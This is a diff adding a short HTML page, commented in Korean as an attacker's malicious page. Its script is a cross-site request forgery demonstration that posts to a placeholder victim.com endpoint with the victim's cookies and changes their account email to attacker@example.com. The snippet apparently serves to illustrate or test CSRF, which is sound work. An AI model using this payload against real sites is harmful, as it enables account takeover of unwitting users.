@@ -1,0 +1,11 @@
+<!-- 공격자가 만든 악성 HTML 페이지 -->
+<script>
+fetch("http://victim.com/update_email.php", {
+  method: "POST",
+  credentials: "include", // 쿠키 자동 전송
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ email: "attacker@example.com" })
+});
+</script>
